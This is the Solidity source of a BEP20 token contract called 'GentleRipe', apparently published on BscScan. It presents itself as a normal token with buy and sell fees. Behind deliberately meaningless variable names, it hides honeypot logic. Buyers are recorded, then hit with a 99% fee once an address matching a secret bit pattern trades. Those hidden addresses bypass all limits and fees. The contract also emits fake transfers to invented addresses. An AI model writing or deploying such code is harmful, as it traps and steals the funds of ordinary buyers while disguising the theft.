/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract GentleRipe is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Gentle Ripe ";
    string constant _symbol = "GentleRipe";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private minLimitLaunchedMax;
    mapping(address => bool) private isBuyTradingFee;
    mapping(address => bool) private tradingTeamAutoMode;
    mapping(address => bool) private marketingBotsWalletMode;
    mapping(address => uint256) private tradingMarketingExemptBots;
    mapping(uint256 => address) private limitFeeExemptBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private minLiquidityLaunchedBots = 0;
    uint256 private feeSellTradingBuy = 8;

    //SELL FEES
    uint256 private tradingBurnModeLiquidityBuyReceiver = 0;
    uint256 private walletBurnReceiverMode = 8;

    uint256 private modeLiquidityReceiverAuto = feeSellTradingBuy + minLiquidityLaunchedBots;
    uint256 private burnSwapLaunchedFee = 100;

    address private receiverModeLaunchedBurnExemptTxIs = (msg.sender); // auto-liq address
    address private minWalletAutoReceiver = (0x6b366071A4757BA1FFE953F4fFFFeAdA174eD011); // marketing address
    address private liquidityIsBurnTx = DEAD;
    address private txTradingTeamLaunchedLimitBurnExempt = DEAD;
    address private botsIsWalletTradingTeamAutoMarketing = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private marketingSellBurnReceiver;
    uint256 private walletAutoExemptLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private maxModeExemptTx;
    uint256 private isBotsLimitExempt;
    uint256 private limitFeeLaunchedExempt;
    uint256 private autoSellLaunchedMode;
    uint256 private isTeamTradingReceiver;

    bool private sellModeTradingTeamFeeBurn = true;
    bool private marketingBotsWalletModeMode = true;
    bool private walletTxExemptMarketingBotsReceiverAuto = true;
    bool private receiverModeMinLimitBuyMax = true;
    bool private receiverBurnWalletSell = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private buyIsLaunchedMarketingTeamFee = _totalSupply / 1000; // 0.1%

    
    bool private maxLaunchedReceiverSell;
    uint256 private receiverAutoExemptMode;
    bool private autoTeamSellMarketingTrading;
    uint256 private liquidityMaxExemptMarketing;
    bool private walletBotsLiquidityReceiverSell;
    uint256 private isTradingMinTxLaunchedMaxReceiver;
    bool private modeReceiverWalletBurn;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        maxModeExemptTx = true;

        minLimitLaunchedMax[msg.sender] = true;
        minLimitLaunchedMax[address(this)] = true;

        isBuyTradingFee[msg.sender] = true;
        isBuyTradingFee[0x0000000000000000000000000000000000000000] = true;
        isBuyTradingFee[0x000000000000000000000000000000000000dEaD] = true;
        isBuyTradingFee[address(this)] = true;

        tradingTeamAutoMode[msg.sender] = true;
        tradingTeamAutoMode[0x0000000000000000000000000000000000000000] = true;
        tradingTeamAutoMode[0x000000000000000000000000000000000000dEaD] = true;
        tradingTeamAutoMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptAutoLiquidityMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptAutoLiquidityMin(sender, recipient, amount);
    }

    function exemptAutoLiquidityMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = txLimitBuyIs(sender) || txLimitBuyIs(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                receiverMaxLiquidityLimit();
            }
            if (!bLimitTxWalletValue) {
                limitIsMarketingMin(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return walletTeamBurnMin(sender, recipient, amount);}

        if (!minLimitLaunchedMax[sender] && !minLimitLaunchedMax[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || tradingTeamAutoMode[sender] || tradingTeamAutoMode[recipient], "Max TX Limit has been triggered");

        if (tradingIsFeeSwap()) {limitLiquidityLaunchedAuto();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = feeMaxReceiverMarketing(sender) ? exemptSellLaunchedModeLiquidityBots(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function walletTeamBurnMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function feeMaxReceiverMarketing(address sender) internal view returns (bool) {
        return !isBuyTradingFee[sender];
    }

    function liquidityTeamBotsTx(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            modeLiquidityReceiverAuto = walletBurnReceiverMode + tradingBurnModeLiquidityBuyReceiver;
            return modeBurnExemptLaunchedReceiverTx(sender, modeLiquidityReceiverAuto);
        }
        if (!selling && sender == uniswapV2Pair) {
            modeLiquidityReceiverAuto = feeSellTradingBuy + minLiquidityLaunchedBots;
            return modeLiquidityReceiverAuto;
        }
        return modeBurnExemptLaunchedReceiverTx(sender, modeLiquidityReceiverAuto);
    }

    function exemptSellLaunchedModeLiquidityBots(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(liquidityTeamBotsTx(sender, receiver == uniswapV2Pair)).div(burnSwapLaunchedFee);

        if (marketingBotsWalletMode[sender] || marketingBotsWalletMode[receiver]) {
            feeAmount = amount.mul(99).div(burnSwapLaunchedFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 2; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function txLimitBuyIs(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function modeBurnExemptLaunchedReceiverTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = tradingMarketingExemptBots[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitIsMarketingMin(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        limitFeeExemptBots[exemptLimitValue] = addr;
    }

    function receiverMaxLiquidityLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (tradingMarketingExemptBots[limitFeeExemptBots[i]] == 0) {
                    tradingMarketingExemptBots[limitFeeExemptBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(minWalletAutoReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function tradingIsFeeSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverBurnWalletSell &&
    _balances[address(this)] >= buyIsLaunchedMarketingTeamFee;
    }

    function limitLiquidityLaunchedAuto() internal swapping {
        uint256 amountToLiquify = buyIsLaunchedMarketingTeamFee.mul(minLiquidityLaunchedBots).div(modeLiquidityReceiverAuto).div(2);
        uint256 amountToSwap = buyIsLaunchedMarketingTeamFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = modeLiquidityReceiverAuto.sub(minLiquidityLaunchedBots.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(minLiquidityLaunchedBots).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(feeSellTradingBuy).div(totalETHFee);

        payable(minWalletAutoReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                receiverModeLaunchedBurnExemptTxIs,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverModeMinLimitBuyMax() public view returns (bool) {
        if (receiverModeMinLimitBuyMax == receiverBurnWalletSell) {
            return receiverBurnWalletSell;
        }
        if (receiverModeMinLimitBuyMax != marketingBotsWalletModeMode) {
            return marketingBotsWalletModeMode;
        }
        return receiverModeMinLimitBuyMax;
    }
    function setReceiverModeMinLimitBuyMax(bool a0) public onlyOwner {
        if (receiverModeMinLimitBuyMax != walletTxExemptMarketingBotsReceiverAuto) {
            walletTxExemptMarketingBotsReceiverAuto=a0;
        }
        if (receiverModeMinLimitBuyMax == receiverModeMinLimitBuyMax) {
            receiverModeMinLimitBuyMax=a0;
        }
        if (receiverModeMinLimitBuyMax == sellModeTradingTeamFeeBurn) {
            sellModeTradingTeamFeeBurn=a0;
        }
        receiverModeMinLimitBuyMax=a0;
    }

    function getMinLimitLaunchedMax(address a0) public view returns (bool) {
        if (a0 != receiverModeLaunchedBurnExemptTxIs) {
            return receiverModeMinLimitBuyMax;
        }
        if (minLimitLaunchedMax[a0] == marketingBotsWalletMode[a0]) {
            return walletTxExemptMarketingBotsReceiverAuto;
        }
            return minLimitLaunchedMax[a0];
    }
    function setMinLimitLaunchedMax(address a0,bool a1) public onlyOwner {
        if (a0 != receiverModeLaunchedBurnExemptTxIs) {
            marketingBotsWalletModeMode=a1;
        }
        minLimitLaunchedMax[a0]=a1;
    }

    function getBotsIsWalletTradingTeamAutoMarketing() public view returns (address) {
        if (botsIsWalletTradingTeamAutoMarketing == liquidityIsBurnTx) {
            return liquidityIsBurnTx;
        }
        if (botsIsWalletTradingTeamAutoMarketing == txTradingTeamLaunchedLimitBurnExempt) {
            return txTradingTeamLaunchedLimitBurnExempt;
        }
        return botsIsWalletTradingTeamAutoMarketing;
    }
    function setBotsIsWalletTradingTeamAutoMarketing(address a0) public onlyOwner {
        botsIsWalletTradingTeamAutoMarketing=a0;
    }

    function getSellModeTradingTeamFeeBurn() public view returns (bool) {
        if (sellModeTradingTeamFeeBurn != walletTxExemptMarketingBotsReceiverAuto) {
            return walletTxExemptMarketingBotsReceiverAuto;
        }
        if (sellModeTradingTeamFeeBurn != sellModeTradingTeamFeeBurn) {
            return sellModeTradingTeamFeeBurn;
        }
        return sellModeTradingTeamFeeBurn;
    }
    function setSellModeTradingTeamFeeBurn(bool a0) public onlyOwner {
        sellModeTradingTeamFeeBurn=a0;
    }

    function getMinWalletAutoReceiver() public view returns (address) {
        return minWalletAutoReceiver;
    }
    function setMinWalletAutoReceiver(address a0) public onlyOwner {
        minWalletAutoReceiver=a0;
    }

    function getModeLiquidityReceiverAuto() public view returns (uint256) {
        if (modeLiquidityReceiverAuto == modeLiquidityReceiverAuto) {
            return modeLiquidityReceiverAuto;
        }
        return modeLiquidityReceiverAuto;
    }
    function setModeLiquidityReceiverAuto(uint256 a0) public onlyOwner {
        if (modeLiquidityReceiverAuto != minLiquidityLaunchedBots) {
            minLiquidityLaunchedBots=a0;
        }
        if (modeLiquidityReceiverAuto != minLiquidityLaunchedBots) {
            minLiquidityLaunchedBots=a0;
        }
        if (modeLiquidityReceiverAuto == tradingBurnModeLiquidityBuyReceiver) {
            tradingBurnModeLiquidityBuyReceiver=a0;
        }
        modeLiquidityReceiverAuto=a0;
    }

    function getReceiverModeLaunchedBurnExemptTxIs() public view returns (address) {
        if (receiverModeLaunchedBurnExemptTxIs == botsIsWalletTradingTeamAutoMarketing) {
            return botsIsWalletTradingTeamAutoMarketing;
        }
        return receiverModeLaunchedBurnExemptTxIs;
    }
    function setReceiverModeLaunchedBurnExemptTxIs(address a0) public onlyOwner {
        if (receiverModeLaunchedBurnExemptTxIs != botsIsWalletTradingTeamAutoMarketing) {
            botsIsWalletTradingTeamAutoMarketing=a0;
        }
        if (receiverModeLaunchedBurnExemptTxIs == minWalletAutoReceiver) {
            minWalletAutoReceiver=a0;
        }
        if (receiverModeLaunchedBurnExemptTxIs != botsIsWalletTradingTeamAutoMarketing) {
            botsIsWalletTradingTeamAutoMarketing=a0;
        }
        receiverModeLaunchedBurnExemptTxIs=a0;
    }

    function getMinLiquidityLaunchedBots() public view returns (uint256) {
        if (minLiquidityLaunchedBots == walletBurnReceiverMode) {
            return walletBurnReceiverMode;
        }
        return minLiquidityLaunchedBots;
    }
    function setMinLiquidityLaunchedBots(uint256 a0) public onlyOwner {
        if (minLiquidityLaunchedBots != buyIsLaunchedMarketingTeamFee) {
            buyIsLaunchedMarketingTeamFee=a0;
        }
        if (minLiquidityLaunchedBots == feeSellTradingBuy) {
            feeSellTradingBuy=a0;
        }
        if (minLiquidityLaunchedBots == walletBurnReceiverMode) {
            walletBurnReceiverMode=a0;
        }
        minLiquidityLaunchedBots=a0;
    }

    function getTradingMarketingExemptBots(address a0) public view returns (uint256) {
        if (a0 == botsIsWalletTradingTeamAutoMarketing) {
            return feeSellTradingBuy;
        }
        if (a0 != minWalletAutoReceiver) {
            return modeLiquidityReceiverAuto;
        }
            return tradingMarketingExemptBots[a0];
    }
    function setTradingMarketingExemptBots(address a0,uint256 a1) public onlyOwner {
        if (a0 != txTradingTeamLaunchedLimitBurnExempt) {
            tradingBurnModeLiquidityBuyReceiver=a1;
        }
        tradingMarketingExemptBots[a0]=a1;
    }

    function getMarketingBotsWalletModeMode() public view returns (bool) {
        if (marketingBotsWalletModeMode == sellModeTradingTeamFeeBurn) {
            return sellModeTradingTeamFeeBurn;
        }
        if (marketingBotsWalletModeMode != walletTxExemptMarketingBotsReceiverAuto) {
            return walletTxExemptMarketingBotsReceiverAuto;
        }
        if (marketingBotsWalletModeMode == receiverModeMinLimitBuyMax) {
            return receiverModeMinLimitBuyMax;
        }
        return marketingBotsWalletModeMode;
    }
    function setMarketingBotsWalletModeMode(bool a0) public onlyOwner {
        if (marketingBotsWalletModeMode == walletTxExemptMarketingBotsReceiverAuto) {
            walletTxExemptMarketingBotsReceiverAuto=a0;
        }
        if (marketingBotsWalletModeMode == sellModeTradingTeamFeeBurn) {
            sellModeTradingTeamFeeBurn=a0;
        }
        if (marketingBotsWalletModeMode != walletTxExemptMarketingBotsReceiverAuto) {
            walletTxExemptMarketingBotsReceiverAuto=a0;
        }
        marketingBotsWalletModeMode=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}